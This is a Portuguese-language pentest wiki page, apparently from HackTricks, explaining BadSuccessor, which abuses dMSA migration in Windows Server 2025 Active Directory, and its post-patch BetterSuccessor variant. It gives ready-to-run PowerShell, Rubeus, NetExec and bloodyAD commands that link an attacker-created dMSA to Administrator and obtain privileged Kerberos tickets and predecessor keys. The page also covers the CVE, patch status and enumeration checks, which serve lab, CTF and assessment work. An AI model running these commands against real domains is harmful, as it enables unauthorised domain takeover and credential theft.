# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

**BadSuccessor** abusa do fluxo de trabalho de migração de **delegated Managed Service Account** (**dMSA**) introduzido no **Windows Server 2025**. Uma dMSA pode ser vinculada a uma conta legada por meio de **`msDS-ManagedAccountPrecededByLink`** e passar pelos estados de migração armazenados em **`msDS-DelegatedMSAState`**. Se um atacante puder criar uma dMSA em uma OU com permissão de gravação e controlar esses atributos, o KDC poderá emitir tickets para a dMSA controlada pelo atacante com o **contexto de autorização da conta vinculada**.<sup>[[2]](#references)</sup>

Na prática, isso significa que um usuário com poucos privilégios e apenas direitos delegados na OU pode criar uma nova dMSA, vinculá-la a `Administrator`, concluir o estado de migração e, então, obter um TGT cujo PAC contém grupos privilegiados, como **Domain Admins**.<sup>[[2]](#references)</sup>

## Detalhes da migração de dMSA relevantes

- dMSA é um recurso do **Windows Server 2025**.
- `Start-ADServiceAccountMigration` define a migração como **iniciada**.
- `Complete-ADServiceAccountMigration` define a migração como **concluída**.
- `msDS-DelegatedMSAState = 1` significa que a migração foi iniciada.
- `msDS-DelegatedMSAState = 2` significa que a migração foi concluída.
- Durante uma migração legítima, a dMSA deve substituir de forma transparente a conta substituída, então o KDC/LSA preserva o acesso que a conta anterior já tinha.<sup>[[3]](#references)</sup>

O Microsoft Learn também observa que, durante a migração, a conta original é vinculada à dMSA e que a dMSA deve acessar os mesmos recursos que a conta antiga podia acessar.<sup>[[3]](#references)</sup> Essa é a premissa de segurança explorada pelo BadSuccessor.<sup>[[2]](#references)</sup>

## Requisitos

1. Um domínio no qual **dMSA exista**, o que significa que há suporte ao **Windows Server 2025** no lado do AD.
2. O atacante pode **criar** objetos `msDS-DelegatedManagedServiceAccount` em alguma OU ou tem direitos equivalentes e abrangentes para criar objetos filho nessa OU.
3. O atacante pode **gravar** os atributos relevantes da dMSA ou controlar totalmente a dMSA que acabou de criar.
4. O atacante pode solicitar tickets Kerberos a partir de um contexto associado ao domínio ou de um túnel que alcance LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Verificações práticas

A forma mais simples de confirmar isso é verificar o nível do domínio/floresta e confirmar que o ambiente já está usando a nova infraestrutura do Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Se você encontrar valores como `Windows2025Domain` e `Windows2025Forest`, trate **BadSuccessor / dMSA migration abuse** como uma verificação prioritária.

Você também pode enumerar OUs com permissão de escrita delegada para criação de dMSA usando ferramentas públicas:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Fluxo de abuso

1. Crie um dMSA em uma OU na qual você tenha direitos delegados para criar objetos filhos.
2. Defina **`msDS-ManagedAccountPrecededByLink`** como o DN de um alvo privilegiado, como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Defina **`msDS-DelegatedMSAState`** como `2` para marcar a migração como concluída.
4. Solicite um TGT para o novo dMSA e use o ticket retornado para acessar serviços privilegiados.<sup>[[2]](#references)</sup>

Exemplo de PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Exemplos de solicitação de ticket / ferramentas operacionais:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Por que isso é mais do que privilege escalation

Durante uma migração legítima, o Windows também precisa que o novo dMSA processe os tickets emitidos para a conta anterior antes da transição. Por isso, o material de tickets relacionado ao dMSA pode incluir chaves **atuais** e **anteriores** no fluxo **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Em uma migração falsa controlada por um atacante, esse comportamento pode transformar o BadSuccessor em:<sup>[[2]](#references)</sup>

- **Privilege escalation** por herança dos SIDs de grupos privilegiados no PAC.
- **Exposição de material de credenciais**, porque o tratamento de chaves anteriores pode expor material equivalente ao hash RC4/NT do predecessor em fluxos de trabalho vulneráveis.

Isso torna a técnica útil tanto para o comprometimento direto do domínio quanto para operações posteriores, como pass-the-hash ou comprometimento mais amplo de credenciais.

## BetterSuccessor após o patch do KDC

O KDC corrigido valida os dois lados de uma migração de dMSA. Além do `msDS-ManagedAccountPrecededByLink` e do estado de migração do dMSA, o predecessor precisa apontar de volta para o dMSA por meio de `msDS-SupersededManagedAccountLink` e ter um `msDS-SupersededServiceAccountState` compatível. Um link unidirecional agora falha; uma conta que só pode criar um dMSA não pode nomear qualquer predecessor arbitrário. Com `CreateChild` para um dMSA em uma OU **e** acesso efetivo de gravação aos atributos de migração da conta de destino selecionada, um atacante pode estabelecer o link recíproco. O ticket do dMSA resultante pode carregar o contexto de autorização do predecessor e expor suas chaves no pacote de chaves do dMSA. Este é um caminho direcionado de acesso a credenciais/amplificação de privilégios, não uma prova de que o BadSuccessor original, com alvo arbitrário, continua explorável em DCs corrigidos.<sup>[[5]](#references)[[6]](#references)</sup>

Em um laboratório onde o acesso de gravação à conta de destino foi confirmado, `bloodyAD` pode criar o dMSA e executar as gravações de migração correspondentes. Solicite o ticket do dMSA usando o material Kerberos retornado e verifique as permissões reais da conta de destino antes de presumir que os privilégios ou o hash foram recuperados. O nome do subcomando `badSuccessor` da ferramenta não implica o comportamento unidirecional sem correção.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Observações sobre o status do patch

O comportamento original do BadSuccessor **não é apenas um problema teórico da versão prévia de 2025**. A Microsoft atribuiu a ele o **CVE-2025-53779** e publicou uma atualização de segurança em **agosto de 2025**.<sup>[[4]](#references)</sup> Mantenha este ataque documentado para:

- **labs / CTFs / exercícios de assume-breach**
- **ambientes Windows Server 2025 sem patch**
- **validação de delegações de OU e exposição a dMSA durante avaliações**

Não presuma que um domínio Windows Server 2025 é vulnerável só porque existe dMSA; verifique o nível de patch e teste com cuidado.

## Ferramentas

- [Ferramentas BadSuccessor da Akamai](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Módulo `badsuccessor` do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Abuso de dMSA com BadSuccessor para obter Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: abusando de dMSA para escalar privilégios no Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Visão geral de contas de serviço gerenciadas delegadas](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessor está morto, vida longa ao BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: continuando a abusar de dMSA após o patch](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
